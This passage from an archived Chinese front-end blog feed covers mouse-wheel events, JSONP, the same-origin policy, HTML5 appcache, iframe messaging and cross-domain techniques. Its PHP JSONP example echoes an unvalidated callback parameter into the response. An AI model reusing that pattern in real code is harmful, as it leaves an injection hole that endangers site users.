mouse wheel. * That might be ugly, but we handle scrolls somehow * anyway, so don&apos;t bother here.. */ if (event.preventDefault) event.preventDefault(); event.returnValue = false;&#125;/** * Initialization code. * If you use your own event management code, change it as required. */if (window.addEventListener) /** DOMMouseScroll is for mozilla. */ window.addEventListener(&apos;DOMMouseScroll&apos;, wheel, false);/** IE/Opera. */window.onmousewheel = document.onmousewheel = wheel; Handler function 事件处理函数 代码中的”handle”是用户的自定义函数，其中带了一个参数为delta。由于浏览器平台的差异性，我们只能够捕捉到滚动的差值（deltas），这个值是滚轮的变化值。通常，你只能获取到delta的正值与负值，如左图所示。如果delta是正值，滚动向前滚动，反之则为向后滚动。在许多应用中，向上滚动就是页面向上滚动。你可能很疑惑，delta的实际值到底会是什么。实际上，上述代码其实是被调整过的，使得99%的情况下获取到的值要么-1要么就是+1。即时如此，如果在firefox下迅速滚动，会出现&plusmn;3的情况。Digg上有人提出14的delta值，Geoffrey Kruse在他的pc上甚至得到了76的值。当然了，这也取决于鼠标敏感度的设置。firefox有一些微妙的现象：如果快速滚动的同时点击右键（原文 scrolling the wheel fast and then push the right mouse button for the menu），会报出例如30的delta值。//不明白作者是如何触发这个操作的Robert Gerlach在Safari下做了一些测试：”只是滚动一圈的话，值为+-0.1，如果滚动地稍微快点的话（多滚动几圈），这个值也会变大。 这是因为Mac OS下有鼠标滚轮加速功能。滚动一次，浏览器滚动1像素，滚动3次，浏览器却滚动30像素”。同时他也对Camino（基于Gecko的内核引擎）进行研究：\与Safari相似（+- 0.3 to +-Infinity），虽然使用了与firefox相同的内核引擎，但结果这个delta值却只在+-2.666666里浮动，无论滚动速度如何。”在此可以看一下测试页面A与测试页面B。Compatability 兼容性//作者在此感谢了许多人，不作翻译Usability 可用性Few \don’t”s&mdash;&mdash;几个不要不要使用滚动进行一些不符合常理的操作，用户已经习惯用滚轮来作页面滚动之类的操作了。一些map应用使用滚轮进行缩放，这个操作符合用户的预期，大胆使用即可。不要强迫用户依赖滚轮进行操作。//作者的意思是应该提供一种可替换方案，使得在滚轮操作无效的情况下，应用程序仍旧可用尽量避免全局滚动条，这些滚动条可能会给用户在进行滚动时带来一些困惑。Real world examples 应用实例Google Maps利用滚轮进行zoom in/out。ACME MapperGoogle Maps的增强版//在chrome10下滚动无效ImageFlow&nbsp;by Finn Rudolph 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** Event handler for mouse wheel event. *鼠标滚动事件 */ var wheel = function(event) &#123; var delta = 0; if (!event) /* For IE. */ event = window.event; if (event.wheelDelta) &#123; /* IE/Opera. */ delta = event.wheelDelta / 120; &#125; else if (event.detail) &#123; /** Mozilla case. */ /** In Mozilla, sign of delta is different than in IE. * Also, delta is multiple of 3. */ delta = -event.detail / 3; &#125; /** If delta is nonzero, handle it. * Basically, delta is now positive if wheel was scrolled up, * and negative, if wheel was scrolled down. */ if (delta) handle(delta); /** Prevent default actions caused by mouse wheel. * That might be ugly, but we handle scrolls somehow * anyway, so don&apos;t bother here.. */ if (event.preventDefault) event.preventDefault(); event.returnValue = false; &#125; /** Initialization code. * If you use your own event management code, change it as required. */ if (window.addEventListener) &#123; /** DOMMouseScroll is for mozilla. */ window.addEventListener(&apos;DOMMouseScroll&apos;, wheel, false); &#125; /** IE/Opera. */ window.onmousewheel = document.onmousewheel = wheel; /** This is high-level function. * It must react to delta being more/less than zero. */ var handle = function(delta) &#123; var random_num = Math.floor((Math.random() * 100) + 50); if (delta &lt; 0) &#123; // alert(&quot;鼠标滑轮向下滚动：&quot; + delta + &quot;次！&quot;); // 1 $(&quot;btn_next_pic&quot;).onclick(random_num); return; &#125; else &#123; // alert(&quot;鼠标滑轮向上滚动：&quot; + delta + &quot;次！&quot;); // -1 $(&quot;btn_last_pic&quot;).onclick(random_num); return; &#125; &#125; Reference [参考] 1.http://blog.163.com/jinlu_hz/blog/static/113830152201122911356714/ 2.http://qiaolevip.iteye.com/blog/1673396]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript跨域（2）：JSONP跨域]]></title>
    <url>%2Fblog%2F2013%2F04%2F03%2F2013-04-03-cb-CDS_jsonp%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 祭祖归来，继续细说跨域~ 话说上次我们讲到了啥玩意儿是跨域，至于怎么跨域还没开始动笔。今天就说说JSONP跨域。 JSONP（JSON with padding）是JSON的一种\使用模式”，它是非官方协议允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式）。 P.S： 1.楼主懂一点点php，所以DEMO中的后台语言就用PHP来演示。 2.为了方便测试，楼主弄了SAE和BAE。 Prelude [前奏] 如果我们请求一个JSON数据：（SAE地址：http://qianduannotes.sinaapp.com/test/testData_1.json） 123456//一个简单的json数据&#123; &quot;name&quot; : &quot;Barret Lee&quot;, &quot;sex&quot; : &quot;男&quot;, &quot;hobby&quot;: &quot;女&quot;&#125; 报个什么错，大家应该知道了吧~&nbsp;Origin&nbsp;null&nbsp;is not allowed by Access-Control-Allow-Origin 先解释下这个null是个什么东东。很多人在测试的时候是在没有诸如apache、IIS环境下运行的程序，也就是在本地运行，此时origin就是null，所有Access-Control-Allow-Origin这个东西不允许源null请求数据。当然如果你测试的时候在apache下运行，那这里的null就会变成你的IP了~ Then [接着] JSONP，我们开始入题吧~&nbsp; 先说说后台返回个什么东西：（SAE地址：http://qianduannotes.sinaapp.com/test/CDS_jsonp.json） 12345&lt;?php $fun = $_GET[&quot;woo&quot;]; //先假设woo对应的是 trigger ； $ctt = &quot;Barret Lee&quot;; echo $fun . &quot;(&quot; . $ctt . &quot;)&quot;;?&gt; 后台数据解析之后就是这样的： 1trigger(木子Vs立青) 有人就要开始惊叹了，肿么是 木子Vs立青&nbsp;，没有引号包住？？是的，没有引号，当$ctt是一个json数据的时候，我们得到的结果就是： 1trigger(JSON) 然后用一些熟知的方法来解析这些JSON（下次会讲解如何解析JSON）。 说了半天还是没讲客户端的操作，O(&cap;_&cap;)O~ &nbsp;不急不急。 1&lt;script type=&quot;text/javascript&quot; src=&quot;http://qianduannotes.sinaapp.com/test/CDS_jsonp.php?woo=trigger&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function trigger(obj)&#123; //注：这里只是随便写的一个函数，obj是为解析的。 //obj = parse(obj); document.getElementById(&quot;container&quot;).innerHTML = obj; &#125;&lt;/script&gt; 习惯上jsonp请求时，会使用jsonp为参数，即jsonp=trigger，我觉得都无所谓啦，只要你用的爽就行。 如果你想传更多参数，那也是一样的： 1&lt;script type=&quot;text/javascript&quot; src=&quot;http://qianduannotes.sinaapp.com/test/CDS_jsonp.php?woo=trigger&lt;a=va&lt;b=vb&lt;c=vc&quot;&gt;&lt;/script&gt; Attention [注意事项] 1.第一也是最重要的：JSONP不提供错误处理。如果动态插入的代码正常运行，你可以得到返回，但是如果失败了，那么什么都不会发生。你无法获得一个404的错误，也不能取消这个请求。 2.另外一个重要的缺点是如果使用了不信任的服务会造成很大的安全隐患。 Reference [参考资料] 1.wiki 2.百度百科 3.51CTO]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript跨域（1）：什么是跨域，如何跨域]]></title>
    <url>%2Fblog%2F2013%2F03%2F31%2F2013-03-31-cb-CDS-introduce%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 无数次看到：Origin null is not allowed by Access-Control-Allow-Origin&nbsp;, 网络没有让你绝望，但是或许会让你蛋疼，因为你找了半天没看到一个比较实用的解决方案，亦或者水平不够，别人写的东西累赘没看懂，抑或是。。。 网上看到了一篇文章&mdash;&mdash;跨域资源共享的10中方式，已经放在自己的家里了O(&cap;_&cap;)O~ 跨域也是平时项目中比较让人头疼的一个玩意儿，上文只是简要地提出了有哪些跨域方式，这里呢，将向大家详细说明，各种使用频率比较高的跨域方式。 什么是跨域：A&nbsp;cross-domain solution&nbsp;(CDS) is a means of&nbsp;information assurance&nbsp;that provides the ability to manually or automatically access or transfer between two or more differing security domains. 上面是从wiki上引用过来的。意思是：解决两个安全域之间的信息传递，这个就叫做CDS&mdash;&mdash;跨域解决方案。首先解释下怎么样的两个域之间的数据传输需要跨越。&nbsp;What [什么是跨域] JavaScript出于安全方面的考虑，不允许跨域调用其他页面的对象。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。这里把涉及到跨域的一些问题简单地整理一下： 首先什么是跨域，简单地理解就是因为JavaScript同源策略的限制，a.com 域名下的js无法操作b.com或是c.a.com域名下的对象。更详细的说明可以看下表：URL说明是否允许通信http://www.a.com/a.jshttp://www.a.com/b.js同一域名下允许http://www.a.com/lab/a.jshttp://www.a.com/script/b.js同一域名下不同文件夹允许http://www.a.com:8000/a.jshttp://www.a.com/b.js同一域名，不同端口不允许http://www.a.com/a.js//www.a.com/b.js同一域名，不同协议不允许http://www.a.com/a.jshttp://70.32.92.74/b.js域名和域名对应ip不允许http://www.a.com/a.jshttp://script.a.com/b.js主域相同，子域不同不允许http://www.a.com/a.jshttp://a.com/b.js同一域名，不同二级域名（同上）不允许（cookie这种情况下也不允许访问）http://www.cnblogs.com/a.jshttp://www.a.com/b.js不同域名不允许&nbsp;same-origin policy [同源策略] 在客户端编程语言中，如javascript和ActionScript，同源策略是一个很重要的安全理念，它在保证数据的安全性方面有着重要的意义。同源策略规定跨域之间的脚本是隔离的，一个域的脚本不能访问和操作另外一个域的绝大部分属性和方法。 那么什么叫相同域，什么叫不同的域呢？当两个域具有相同的协议(如http), 相同的端口(如80)，相同的host（如www.example.org)，那么我们就可以认为它们是相同的域。比如http://www.example.org/和http://www.example.org/sub/是同域，而http://www.example.org, //www.example.org, http://www.example.org:8080, http://sub.example.org中的任何两个都将构成跨域。同源策略还应该对一些特殊情况做处理，比如限制file协议下脚本的访问权限。本地的html文件在浏览器中是通过file协议打开的，如果脚本能通过file协议访问到硬盘上其它任意文件，就会出现安全隐患，目前IE8还有这样的隐患。 受到同源策略的影响，跨域资源共享就会受到制约。但是随着人们的实践和浏览器的进步，目前在跨域请求的技巧上，有很多宝贵经验的沉淀和积累。这里我把跨域资源共享分成两种，一种是单向的数据请求，还有一种是双向的消息通信。 How [如何跨域] 你可以看看这个提纲，跨域十法，也可以等等，我会很详细很具体地告诉你如何跨域~ O(&cap;_&cap;)O哈哈~ 下一节将给大家细说JSONP方法跨域。 Reference [参考资料] 1.wiki 2.疯狂小强 3.Rain Man]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript本地储存（3）：离线web应用]]></title>
    <url>%2Fblog%2F2013%2F03%2F30%2F2013-03-30-cb-javascript-applicationcache%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 前两篇文章分别介绍了Cookie应用和另一种本地储存方式，无论是cookie、userData还是localStorage都是一段保存在客户端磁盘的一段文本，他们可以被主动删除，但是本文要讲的\应用程序缓存”是HTML5中新增的一个技术，他允许web应用将应用程序自身本地保存到用户的浏览器中，他是不会随着用户清楚浏览器缓存而被清除的。不像localStorage和sessionS只是保存web应用程序相关的数据，他是将应用程序本身保存起来&mdash;&mdash;应用程序所需运行的所有文件（HTML、CSS、JavaScript、图片等）。&mdash;&mdash;《Javascript权威指南（第六版）》Page-594 \应用程序缓存”真正意义上不是\”缓存，更好的说法应该称之为\应用程序存储”。 Introduction [简单介绍] 通过在应用程序主HTML页面的&lt;html&gt;标签中设置manifest属性，只想到清单文件就行了。这里的清单文件就是，将要缓存的文件列表。 12345&lt;!DOCTYPE HTML&gt;&lt;html manifest=&quot;myapp.appcache&quot;&gt; &lt;head&gt;...&lt;/head&gt; &lt;body&gt;...&lt;/body&gt;&lt;/html&gt; 清单文件格式也是有要求的，他的杭寿必须以\CACHE MANIFEST”字符串开始，其余就是要缓存的文件URL列表，一行一个URL。 12345678CACHE MANIFEST#上一行表示此文件是一个清单文件。本行为注释#下面的内容都是应用程序依赖的资源文件的URLmyapp.htmlmyapp.jsmyapp.cssimages/backgorund.png 有人可能会问了：那清单文件一定要以appcache作为未见的扩展名么？ 答案是否定的，web服务器真正识别清单文件的方式是通过”text/cache-manifest”这个MIME类型的一个清单。如果服务器将清单文件的Content-Type的头信息设置成其他MIME类型，那就不会缓存应用程序了，因此，肯呢过需要对web服务器做一定的配置来使用这个MIME类型，比如在web应用目录下创建Apache服务器的一个.htaccess文件。More [更多介绍]1.复杂的清单 先给个清单： 123456789101112CACHE MANIFESTCACHE:myapp.htmlmyapp.cssmyapp.jsFALLBACKvideo/ offline_help.htmlNETWORK:cgi/ “CACHE”应该是不用细说了。 “NETWORK”： 标识了该ＵＲＬ中的资源从不缓存，总要通过网络获取。 “FALLBACK”：区域中的清单项每行都包含两个URL，第二个URL是指需要加载和存储在缓存中的资源，第一个URL是一个前缀。任何能够匹配到这个前缀的URL都不会缓存起来，但是可能的haunted，他们会从网络中载入。如果从网络中载入这样一个URL失败的话，就会使用第二个URL指定的缓存资源来代替，从缓存中获取。 想想一个web应用包含一定数量的视频教程，这些视频都很大，显然把他们缓存在本地是不合适的，因为，在离线状态心爱，通过清单文件中的fallback区域，就可以使用一些急于文本的帮助文件来代替了。2.缓存的更新 1234CACHE MANIFEST# MyApp version 1 (更改这个数九就可以让浏览器重新下载这个文件)Myapp.htmlMyapp.js 浏览器在检查清单文件以及更新缓存的操作是异步的，可能是在从缓存中载入应用之前，也可能同时进行。 浏览器在更新缓存过程中会触发一系列事件，可以通过注册处理程序来跟踪这个过程同时提供反馈给用户。如下： 1234applicationCache.onupdateready = function()&#123; var reload = confirm(&quot;发现一个新版本，需要刷新页面，点击确定刷新。&quot;); if(reload) locatiuon.reload();&#125; 注：只有支持应用程序缓存的浏览器才会有applicationCache属性，当然除了上面例子的updateready时间之外，还有其他7中应用程序缓存时间可以监控。 123456789101112131415161718var appCache = window.applicationCache;function logEvent(e) &#123; console.log(e);&#125;function logError(e) &#123; console.log(\error &quot; + e);&#125;;appCache.addEventListener(&quot;cached&quot;, logEvent, false);appCache.addEventListener(&quot;checking&quot;, logEvent, false);appCache.addEventListener(&quot;downloading&quot;, logEvent, false);appCache.addEventListener(&quot;error&quot;, logError, false);appCache.addEventListener(&quot;noupdate&quot;, logEvent, false);appCache.addEventListener(&quot;obsolete&quot;, logEvent, false);appCache.addEventListener(&quot;progress&quot;, logEvent, false);appCache.addEventListener(&quot;updateready&quot;, logEvent, false); Related blog [相关博文] JavaScript本地储存（1）：cookie在前端 JavaScript本地储存（2）：userData和localStorage&nbsp; Reference [参考资料] 1.《JavaScript权威指南（第六版）》&mdash;&mdash; 淘宝团队翻译&nbsp;&nbsp; 当当 2. other]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iframe跨域通信的通用解决方案]]></title>
    <url>%2Fblog%2F2013%2F03%2F29%2F2013-03-29-cb-lightweight-solution-for-an-iframe-cross-domain-communication%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 一、背景在这个Web页面越来越丰富的时代，页面通过iframe嵌入其他的页面也越来越常见。但由于浏览器同源策略的限制，不同域之间属性和操作是无法直接交互的，所以在这个时候，开发者多多少少需要一些方案来突破这些限制。跨域问题涉及的地方也很多，如文档之间的消息通信、ajax请求、Cookie等，本文讨论的是iframe和父页面的消息通信。 二、现状目前网上也可以找到各种解决方案（少说都有10+个，有兴趣的话可以去看看），对于现代浏览器来说，原生的postMessage API一定是不二的选择，所以各种方案的不同点均在于IE 6、7中的处理（不用兼容IE6、7的同志可以去看其他文章了）。当然这么多方案有各种优缺点，甚至有些只支持单向跨域，个人觉得实际意义不大。另外一些方案需要proxy.html这样的代理页面做中转，但是涉及服务器上的部署，并且对于多方合作来说还是有些麻烦。三、思路虽然不再复述现有的各种方案，但还是想交待一点上下文。相信网上看到最多方案就是利用location.hash或是window.name进行iframe的跨域通信：location.hash会直接暴露在URL里，并且在一些浏览器里会产生历史记录，数据安全性不高也影响用户体验，所以不做考虑。另外由于URL大小的限制，支持传递的数据量也不大。window.name相比来讲就好很多了，支持2M的数据量，并且当iframe的页面跳到其他地址时，其window.name值保持不变，副作用可以说是最小的。讲到这思路也比较清晰了，咱们就用window.name呗，但问题又来了：只有两个页面同域时才能访问window.name。这个问题还好，只要把iframe改为与父页面同域就可以了。这又衍生了新的问题：这不是意味着只能单向通信了吗，iframe怎么向父页面发消息（不可能去改父页面的location吧）？在暗骂坑爹的同时偶然发现了一个很神奇的方法，就是想访问一个iframe的window.name时，只要将其location改为”about:blank”即可，屡试不爽~没错这个\特性”可以视为IE6/7的一项安全性问题，但利用这个特性来进行跨域通信并没有实际的安全风险。具体的实现见下图，在iframe的内部再创建一个iframe（我们称之为信使），父子页面轮询信使的window.name，父子页面各自使用变量保存window.name，轮询时发现有变化即被视为收到消息。基本原理就是这么简单，我们继续..图1作为一个通用的解决方案，我们的目标是提供一个js文件，封装通信的接口，需要通信的页面只要加载js文件就行。但在封装前，需要考虑更复杂一点的情况：当父子页面双方频率较高地双向通信时，如何进行支持？按照上述的方案，信使的window.name并没有读写锁的概念，这意味着消息很容易乱掉或被漏掉。所以更好的方案应该是：创建两个信使，分别负责”父–&gt;子”和”子–&gt;父”的消息传递，并且为了防止消息被冲掉，发送消息时会维护一个消息队列，在取消息时处理消息队列里的所有消息。见图2。图2四、封装最后的封装就是加入了postMessage API的检测，另外也要判断是否为跨域，这样就满足了所有iframe通信的情况了。这里实现的信使只负责消息的监听和发送，所以在使用上是非常简单的：1234567891011// 父页面中// 初始化信使, 告知与其交互的iframe引用var messenger = Messenger.initInParent(iframeEl);// 监听消息messenger.onmessage = function (data) &#123; ...&#125;;// 发送消息messenger.send(message);1234567891011// iframe中// 初始化信使var messenger = Messenger.initInIframe();// 监听消息messenger.onmessage = function (data) &#123; ...&#125;;// 发送消息messenger.send(message);具体使用可以参考下方的demo : )五、总结虽然国内也有人提过使用”about:blank”进行iframe通信的，但是代码的封装和可读性都不是太好，本方案是一日本人所提出，我觉得处理的很好，所以就拿出来和大家分享下。虽然尝试过优化轮询那一块，但暂时无果，有兴趣的朋友可以一起研究下~DEMO：点击这里脚本下载：http://biqing.alloyteam.com/lab/messenger/messenger.jsGitHub：//github.com/biqing/MessengerJS 原文链接：http://www.alloyteam.com/2012/08/lightweight-solution-for-an-iframe-cross-domain-communication]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域资源共享的10种方式]]></title>
    <url>%2Fblog%2F2013%2F03%2F29%2F2013-03-29-cb-ten-methods-cross-domain%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 在客户端编程语言中，如javascript和ActionScript，同源策略是一个很重要的安全理念，它在保证数据的安全性方面有着重要的意义。同 源策略规定跨域之间的脚本是隔离的，一个域的脚本不能访问和操作另外一个域的绝大部分属性和方法。那么什么叫相同域，什么叫不同的域呢？同源策略在客户端编程语言中，如javascript和ActionScript，同源策略是一个很重要的安全理念，它在保证数据的安全性方面有着重要的意义。同源策略规定跨域之间的脚本是隔离的，一个域的脚本不能访问和操作另外一个域的绝大部分属性和方法。那么什么叫相同域，什么叫不同的域呢？当两个域具有相同的协议(如http), 相同的端口(如80)，相同的host（如www.example.org)，那么我们就可以认为它们是相同的域。比如http://www.example.org/和http://www.example.org/sub/是同域，而http://www.example.org, //www.example.org, http://www.example.org:8080, http://sub.example.org中的任何两个都将构成跨域。同源策略还应该对一些特殊情况做处理，比如限制file协议下脚本的访问权限。本地的html文件在浏览器中是通过file协议打开的，如果脚本能通过file协议访问到硬盘上其它任意文件，就会出现安全隐患，目前IE8还有这样的隐患。受到同源策略的影响，跨域资源共享就会受到制约。但是随着人们的实践和浏览器的进步，目前在跨域请求的技巧上，有很多宝贵经验的沉淀和积累。这里我把跨域资源共享分成两种，一种是单向的数据请求，还有一种是双向的消息通信。接下来我将罗列出常见的一些跨域方式，以下跨域实例的源代码可以从这里获得。单向跨域JSONPJSONP (JSON with Padding)是一个简单高效的跨域方式，html中的script标签可以加载并执行其他域的JavaScript，于是我们可以通过script标记来动态加载其他域的资源。例如我要从域A的页面pageA加载域B的数据，那么在域B的页面pageB中我以JavaScript的形式声明pageA需要的数据，然后在pageA中用script标签把pageB加载进来，那么pageB中的脚本就会得以执行。JSONP在此基础上加入了回调函数，pageB加载完之后会执行pageA中定义的函数，所需要的数据会以参数的形式传递给该函数。JSONP易于实现，但是也会存在一些安全隐患，如果第三方的脚本随意地执行，那么它就可以篡改页面内容，截获敏感数据。但是在受信任的双方传递数据，JSONP是非常合适的选择。flash URLLoaderflash有自己的一套安全策略，服务器可以通过crossdomain.xml文件来声明能被哪些域的SWF文件访问，SWF也可以通过API来确定自身能被哪些域的SWF加载。当跨域访问资源时，例如从域www.a.com请求域www.b.com上的数据，我们可以借助flash来发送HTTP请求。首先，修改域www.b.com上的crossdomain.xml(一般存放在根目录，如果没有需要手动创建) ，把www.a.com加入到白名单。其次，通过Flash URLLoader发送HTTP请求，最后，通过Flash API把响应结果传递给JavaScript。Flash URLLoader是一种很普遍的跨域解决方案，不过需要支持iOS的话，这个方案就无能为力了。Access ControlAccess Control是比较超越的跨域方式，目前只在很少的浏览器中得以支持，这些浏览器可以发送一个跨域的HTTP请求（Firefox, Google Chrome等通过XMLHTTPRequest实现，IE8下通过XDomainRequest实现），请求的响应必须包含一个Access-Control-Allow-Origin的HTTP响应头，该响应头声明了请求域的可访问权限。例如www.a.com对www.b.com下的asset.php发送了一个跨域的HTTP请求，那么asset.php必须加入如下的响应头：window.namewindow对象的name属性是一个很特别的属性，当该window的location变化，然后重新加载，它的name属性可以依然保持不变。那么我们可以在页面A中用iframe加载其他域的页面B，而页面B中用JavaScript把需要传递的数据赋值给window.name，iframe加载完成之后，页面A修改iframe的地址，将其变成同域的一个地址，然后就可以读出window.name的值了。这个方式非常适合单向的数据请求，而且协议简单、安全。不会像JSONP那样不做限制地执行外部脚本。server proxy在数据提供方没有提供对JSONP协议或者window.name协议的支持，也没有对其它域开放访问权限时，我们可以通过server proxy的方式来抓取数据。例如当www.a.com域下的页面需要请求www.b.com下的资源文件asset.txt时，直接发送一个指向www.b.com/asset.txt的Ajax请求肯定是会被浏览器阻止。这时，我们在www.a.com下配一个代理，然后把Ajax请求绑定到这个代理路径下，例如www.a.com/proxy/, 然后这个代理发送HTTP请求访问www.b.com下的asset.txt，跨域的HTTP请求是在服务器端进行的，客户端并没有产生跨域的Ajax请求。这个跨域方式不需要和目标资源签订协议，带有侵略性，另外需要注意的是实践中应该对这个代理实施一定程度的保护，比如限制他人使用或者使用频率。双向跨域document.domain通过修改document的domain属性，我们可以在域和子域或者不同的子域之间通信。同域策略认为域和子域隶属于不同的域，比如www.a.com和sub.a.com是不同的域，这时，我们无法在www.a.com下的页面中调用sub.a.com中定义的JavaScript方法。但是当我们把它们document的domain属性都修改为a.com，浏览器就会认为它们处于同一个域下，那么我们就可以互相调用对方的method来通信了。FIM – Fragment Identitier Messaging不同的域之间，JavaScript只能做很有限的访问和操作，其实我们利用这些有限的访问权限就可以达到跨域通信的目的了。FIM (Fragment Identitier Messaging)就是在这个大前提下被发明的。父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为frag，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带frag，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。FIM的原理就是改变URL的frag部分来进行双向通信。每个window通过改变其他window的location来发送消息，并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，URL在浏览器下有长度限制，这个制约了每次传送的数据量。Flash LocalConnection页面上的双向通信也可以通过Flash来解决，Flash API中有LocalConnection这个类，该类允许两个SWF之间通过进程通信，这时SWF可以播放在独立的Flash Player或者AIR中，也可以嵌在html页面或者是PDF中。遵循这个通信原则，我们可以在不同域的HTML页面各自嵌套一个SWF来达到相互传递数据的目的了。SWF通过LocalConnection交换数据是很快的，但是每次的数据量有40kb的大小限制。用这种方式来跨域通信过于复杂，而且需要了2个SWF文件，实用性不强。window.postMessagewindow.postMessage是html5定义的一个很新的方法，这个方法可以很方便地跨window通信。由于它是一个很新的方法，所以在很旧和比较旧的浏览器中都无法使用。Cross FrameCross Frame是FIM的一个变种，它借助了一个空白的iframe，不会产生多余的浏览器历史记录，也不需要轮询URL的改变，在可用性和性能上都做了很大的改观。它的基本原理大致是这样的，假设在域www.a.com上有页面A.html和一个空白代理页面proxyA.html, 另一个域www.b.com上有个页面B.html和一个空白代理页面proxyB.html，A.html需要向B.html中发送消息时，页面会创建一个隐藏的iframe, iframe的src指向proxyB.html并把message作为URL frag，由于B.html和proxyB.html是同域，所以在iframe加载完成之后，B.html可以获得iframe的URL，然后解析出message，并移除该iframe。当B.html需要向A.html发送消息时，原理一样。Cross Frame是很好的双向通信方式，而且安全高效，但是它在Opera中无法使用，不过在Opera下面我们可以使用更简单的window.postMessage来代替。总结跨域的方法很多，不同的应用场景我们都可以找到一个最合适的解决方案。比如单向的数据请求，我们应该优先选择JSONP或者window.name，双向通信我们采取Cross Frame，在未与数据提供方没有达成通信协议的情况下我们也可以用server proxy的方式来抓取数据。&nbsp; 原文：http://www.woiweb.net/10-cross-domain-methods.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSON]]></title>
    <url>%2Fblog%2F2013%2F03%2F28%2F2013-03-28-JSON%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。 易于人阅读和编写。同时也易于机器解析和生成。 它基于JavaScript Programming Language,&nbsp;Standard ECMA-262 3rd Edition - December 1999的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等）。 这些特性使JSON成为理想的数据交换语言。JSON建构于两种结构：\名称/值”对的集合（A collection of name/value pairs）。不同的语言中，它被理解为对象（object），纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。JSON具有以下这些形式：对象是一个无序的\”名称/值”对”集合。一个对象以{“（左括号）开始，}“（右括号）结束。每个\名称”后跟一个\:”（冒号）；\”名称/值” 对”之间使用\,”（逗号）分隔。数组是值（value）的有序集合。一个数组以[“（左中括号）开始，]“（右中括号）结束。值之间使用\,”（逗号）分隔。值（value）可以是双引号括起来的字符串（string）、数值(number)、true、false、&nbsp;null、对象（object）或者数组（array）。这些结构可以嵌套。字符串（string）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。字符串（string）与C或者Java的字符串非常相似。数值（number）也与C或者Java的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。空白可以加入到任何符号之间。 以下描述了完整的语言。原文链接：http://json.org/json-zh.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript本地储存（2）：userData和localStorage]]></title>
    <url>%2Fblog%2F2013%2F03%2F28%2F2013-03-28-cb-javascript-userdata-and-localstorage%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 上文对cookie的知识进行了归纳，同时也提到了cookie的大小是有限制的。cookie 是有大小限制的，每个 cookie 所存放的数据不能超过4kb，如果 cookie 字符串的长度超过4kb，则该属性将返回空字符串。&mdash;&mdash;上文提要 如果我们需要在客户端储存比较大容量的数据，怎么办？下面给大家介绍userData和localStorage的基本知识和一些应用。先说明下为什么把两个东西扯到一起说，因为后面写了个对象，把UserData和localStorage包装到了一起O(&cap;_&cap;)O~ Conception [基本概念] 毫无疑问，无论是UserData还是localStorage都是储存在客户端磁盘的一段文本，但是两者也有很大的差异性。 1.UserData 单单说UserData是不太准确的，要实现本地储存得说\UserData Behavior”。 UserData Behavior&mdash;&mdash; Enables the object to persist data in user data. 这是来自微软的解释。意思是允许对象在用户页面保存数据。它适用于win32和Unix的MS IE5.0版本以上平台。Security ZoneDocument Limit (KB)Domain Limit (KB)Local Machine1281024Intranet51210240Trusted Sites1281024Internet1281024Restricted64640 上表是UserData的大小限制，也是从微软那里拷贝过来的，大家应该知道IE浏览器有可以设置安全等级 表格里的几个英文单词就对应着看吧，~(≧▽≦)/~ 2.localStorageWeb storage is being standardized by the World Wide Web Consortium (W3C). It was originally part of the HTML 5 specification, but is now in a separate specification. It is supported by Internet Explorer 8, Mozilla-based browsers ,Safari 4, Google Chrome 4, and Opera 10.50. As of 14 March 2011 Opera and IE9 